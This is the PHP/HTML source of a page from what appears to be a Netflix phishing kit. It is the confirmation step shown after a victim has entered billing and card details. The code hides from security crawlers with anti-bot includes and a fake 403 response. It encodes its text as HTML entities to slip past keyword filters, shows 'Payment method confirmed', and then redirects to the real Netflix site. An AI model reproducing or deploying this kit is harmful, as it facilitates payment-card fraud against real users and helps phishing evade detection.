<?php
session_start();
error_reporting(0);
$useragent = $_SERVER['HTTP_USER_AGENT'];
include("../Bots/fucker.php");
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
@require("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

$settings = include '../../settings/settings.php';

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

$bot = include '../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}


?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>&#78;&#101;&#116;&#102;&#108;&#105;&#120;</title>
    <link rel="stylesheet" href="assets/css/master.css?rand=<?php echo rand(); ?>">
    <link rel="stylesheet" href="assets/css/loading.css">
    <link rel="stylesheet" href="assets/css/loading-btn.css">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
    <meta http-equiv="refresh" content="15 url= https://netflix.com">
    <link type="text/css" rel="stylesheet" href="../assets/img/icon.ico"/>
    <link rel="&#115;&#104;&#111;&#114;&#116;cut icon" href="../assets/img/icon.ico"/>
    <link rel="stylesheet" href="assets/css/animate.css">
    <script src="assets/js/cleve.js" charset="utf-8"></script>
  </head>
  <body>
    <div class="header">
      <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-lo&#103;&#111;" focusable="true"><title>&#78;&#101;&#116;&#102;&#108;&#105;&#120;</title><g id="netflix-lo&#103;&#111;"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" id="Fill-14"></path></g></svg>
      <div>
&#83;&#105;&#103;&#110;&#32;&#79;&#117;&#116;

      </div>
    </div>
    <div class="" id="step4">
      <div class="minbody">
        <div class="shield"></div>
        <h1>&#89;&#111;&#117;&#39;&#114;&#101;&#32;&#97;&#108;&#108;&#32;&#115;&#101;&#116;&#33;</h1>
        <ul>
          <li>&#66;&#105;&#108;&#108;&#105;&#110;&#103;&#32;&#97;&#100;&#100;&#114;&#101;&#115;&#115; &#117;&#112;&#100;&#97;&#116;&#101;d.</li>
          <li>&#80;&#97;&#121;&#109;&#101;&#110;&#116;&#32;&#109;&#101;&#116;&#104;&#111;&#100; &#99;&#111;&#110;&#102;&#105;&#114;&#109;ed.</li>
        </ul>
        <a on&#99;&#108;&#105;&#99;&#107;="loginNetflix()"><button>&#83;&#73;&#71;&#78;&#32;&#73;&#78;</button></a>
      </div>
    </div>
    <div class="footer">
      <div class="wrapper">
        <a>&#81;&#117;&#101;&#115;&#116;&#105;&#111;&#110;&#115;&#63; &#67;&#111;&#110;&#116;&#97;&#99;&#116;&#32;&#117;&#115;&#46;</a>
        <ul>
          <li>&#70;&#65;&#81;</li>
          <li>&#72;&#101;&#108;&#112; &#67;&#101;&#110;&#116;&#101;&#114;</li>
          <li>&#84;&#101;&#114;&#109;&#115; &#111;&#102;&#32;&#85;&#115;&#101;</li>
          <li>&#80;&#114;&#105;&#118;&#97;&#99;&#121;</li>
        </ul>
        <ul class="a">
          <li>&#67;&#111;&#111;&#107;&#105;&#101; &#80;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;s</li>
          <li>&#67;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#101;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;</li>
        </ul>
        <select id="region">
          <option value="ar">&#1575;&#1604;&#1593;&#1585;&#1576;&#1610;&#1577;</option>
          <option value="fr">&#70;&#114;&#97;&#110;&#231;&#97;&#105;&#115;</option>
          <option selected="" value="en">&#69;&#110;&#103;&#108;&#105;&#115;&#104;</option>
        </select>
      </div>
    </div>
    <div class="layer hidden" id="cvv">
      <div class="close" id="close"></div>
      <div class="span">&#89;&#111;&#117;&#114; &#99;&#97;&#114;&#100;&#39;&#115; &#115;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &#99;&#111;&#100;&#101;&#32;&#40;&#67;&#86;&#86;&#41;&#32;&#105;&#115; &#116;&#104;&#101; &#51;&#32;&#111;&#114;&#32;&#52;&#32;&#100;&#105;&#103;&#105;&#116;&#32;&#110;&#117;&#109;&#98;&#101;&#114; &#108;&#111;&#99;&#97;&#116;&#101;&#100; &#111;&#110; &#116;&#104;&#101; &#98;&#97;&#99;&#107;&#32;&#111;&#102;&#32;&#109;&#111;&#115;&#116; &#99;&#97;&#114;&#100;s.</div>
      <div class="bg_visa"></div>
      <div class="bg_amex"></div>
    </div>
    <script src="assets/js/main.js?rand=<?php echo rand(); ?>" charset="utf-8"></script>
  </body>
</html>
